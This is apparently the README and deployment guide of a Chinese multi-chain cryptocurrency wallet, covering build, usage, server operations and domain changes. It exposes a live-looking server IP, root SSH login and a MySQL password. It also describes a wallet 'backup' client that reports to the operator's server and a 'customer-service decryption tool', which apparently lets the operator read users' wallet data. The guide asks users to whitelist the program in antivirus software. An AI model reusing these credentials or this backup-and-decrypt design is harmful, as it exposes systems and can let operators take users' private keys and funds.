# 多链钱包工具 - 完整使用与部署指南

## 📋 项目概述
本项目是一个支持多链（TRON/BSC/ETH）的数字钱包应用，包含桌面端、移动端和Web端。
- **技术栈**: Python + PyQt6 + Web3 + TronPy + Flutter
- **架构**: 三端共享核心逻辑，云端API统一交互

---

## 🏗️ 架构设计
### 整体结构
```
┌─────────────────────────────────────────────────┐
│                  云端服务层                      │
│  wallet_api_service.py (5001)                   │
│  server.py (备份服务, 5002)                     │
└──────────────┬──────────────────────────────────┘
               │
       ┌───────┼───────┐
       ▼       ▼       ▼
   桌面端    移动端    Web端
  (PyQt6)  (Flutter) (Flutter)
```

### 模块职责
| 模块 | 路径 | 说明 |
|------|------|------|
| `modules/wallet_core.py` | 核心逻辑 | 多链支持、密钥管理、交易签名 |
| `modules/wallet_api.py` | 云端API | 供移动端/Web调用 (5001端口) |
| `houduan/server.py` | 备份服务 | MySQL数据库存储 (5002端口) |
| `desktop/main.py` | 桌面端 | PyQt6 UI + 本地API |
| `mobile_app/` | 移动端 | Flutter Android/iOS/Web |

---

## 一、开发环境运行

### 1. 安装依赖
```bash
cd qianbao
pip install -r requirements.txt
```

### 2. 运行程序
```bash
python main.py
```

---

## 二、EXE打包方法

### Windows系统
双击运行 `build_exe.bat` 或在命令行执行：
```bash
build_exe.bat
```

打包完成后，EXE文件位于：
```
dist\多链钱包工具.exe
```

---

## 三、客户使用指南

### 1. 首次使用
- 双击 `多链钱包工具.exe`
- 等待程序启动（首次可能较慢）
- 在"钱包管理"Tab中创建或导入钱包
- 选择要操作的区块链网络

### 2. 功能说明

#### 钱包管理
- 创建新钱包：自动生成私钥和地址
- 导入钱包：通过私钥导入已有钱包
- 切换网络：支持BSC/ETH/TRON/Polygon/Avalanche

#### 资产查询
- 查询当前网络的余额
- 显示钱包地址和私钥
- 支持一键复制地址

#### 转账功能
- 输入接收地址和金额
- 自动计算Gas费用
- 确认交易并广播到区块链

#### 交易记录
- 查看历史交易
- 显示交易状态和哈希
- 支持导出交易记录

---

## 四、数据文件说明

所有数据保存在 `data/` 目录下：

| 文件名 | 说明 |
|--------|------|
| wallets.json | 钱包列表（加密存储） |
| settings.json | 用户设置 |
| transactions.json | 交易历史记录 |

---

## 五、注意事项与常见问题

⚠️ **重要提醒**：

1. **私钥安全**：私钥是资产的唯一凭证，请妥善保管
2. **网络要求**：需要能访问区块链RPC节点
3. **杀毒软件**：可能误报，请添加信任
4. **首次运行**：解压临时文件，可能较慢
5. **数据备份**：定期备份 `data/` 目录
6. **测试先行**：建议先用小额测试转账功能

---

## 六、常见问题

### Q1: 程序启动失败？
A: 检查是否安装了Visual C++运行库，下载地址：
https://aka.ms/vs/17/release/vc_redist.x64.exe

### Q2: 余额查询失败？
A: 检查网络连接，确认选择的区块链网络可用

### Q3: 转账失败？
A: 确认余额充足（包含Gas费），检查接收地址格式

### Q4: 私钥丢失怎么办？
A: 私钥无法找回，请务必做好备份

---

## 六、服务器配置与运维
### 服务器信息
- **IP地址**: `47.83.0.101`
- **SSH用户**: `root`
- **MySQL密码**: `WalletBackup2026!`

### 常用操作
```bash
# 重启所有服务
bash /root/deploy_server.sh

# 检查服务状态
ps aux | grep python3
tail -f /root/wallet/api.log

# Nginx操作
nginx -t && systemctl reload nginx
```

### 数据库备份
```bash
mysqldump -u root -p'WalletBackup2026!' wallet_backup > backup.sql
```

---

## 七、代码结构与优化建议
### 核心调用流程
1. **初始化**: `MultiChainWallet.__init__` → `_load_or_create_wallet` → `_init_evm/tron_wallet`
2. **余额查询**: `get_balance` → `CHAIN_CONFIG` → `_get_trx/evm_balance`
3. **转账**: `transfer` → `_transfer_evm/tron` → 广播交易

### 专业级优化方向
1. **架构重构**: 采用无状态设计，避免全局变量导致串钱包
2. **安全增强**: 私钥临时派生，用完即销毁，不常驻内存
3. **节点策略**: 增加超时控制、熔断机制和健康检查
4. **缓存机制**: 余额查询增加5-10秒本地缓存
5. **异常处理**: 建立统一的自定义异常体系

---

## 八、部署配置修改（改域名只需改4个文件）

### 1. 桌面端钱包备份客户端
**文件路径**: `desktop/modules/wallet_backup_client.py`  
**修改位置**: 第21行  
```python
SERVER_URL = "https://api.ai656.top"  # 改成你的域名
```

### 2. 客服解密工具
**文件路径**: `decrypt_tool_gui.py`  
**修改位置**: 第19行  
```python
DEFAULT_SERVER_URL = "https://api.ai656.top"  # 改成你的域名
```

### 3. 手机端前端（Flutter）
**文件路径**: `mobile_app/frontend/lib/config/api_config.dart`  
**修改位置**: 第5行  
```dart
static const String serverUrl = 'https://api.ai656.top';  // 改成你的域名
```

### 4. 手机端后端（Python Flask）
**文件路径**: `mobile_app/backend/.env`  
**修改位置**: 第5行  
```bash
SERVER_DOMAIN="api.ai656.top"  # 改成你的域名（不含协议）
```

#### 快速替换命令（Windows PowerShell）
```powershell
(Get-Content desktop\modules\wallet_backup_client.py) -replace 'api\.ai656\.top', '新域名.com' | Set-Content desktop\modules\wallet_backup_client.py
(Get-Content decrypt_tool_gui.py) -replace 'api\.ai656\.top', '新域名.com' | Set-Content decrypt_tool_gui.py
(Get-Content mobile_app\frontend\lib\config\api_config.dart) -replace 'api\.ai656\.top', '新域名.com' | Set-Content mobile_app\frontend\lib\config\api_config.dart
(Get-Content mobile_app\backend\.env) -replace 'api\.ai656\.top', '新域名.com' | Set-Content mobile_app\backend\.env
```

#### 注意事项
1. **手机端后端的.env文件中只写域名，不要带协议**（如：`api.ai656.top`）
2. **其他3个文件需要带完整URL**（如：`https://api.ai656.top`）
3. 修改后记得重启相关服务
4. 如果使用了HTTPS，确保新域名已配置SSL证书

---

**版本**: 1.0.0  
**技术栈**: Python + PyQt6 + Web3 + TronPy + Flutter  
**打包工具**: PyInstaller
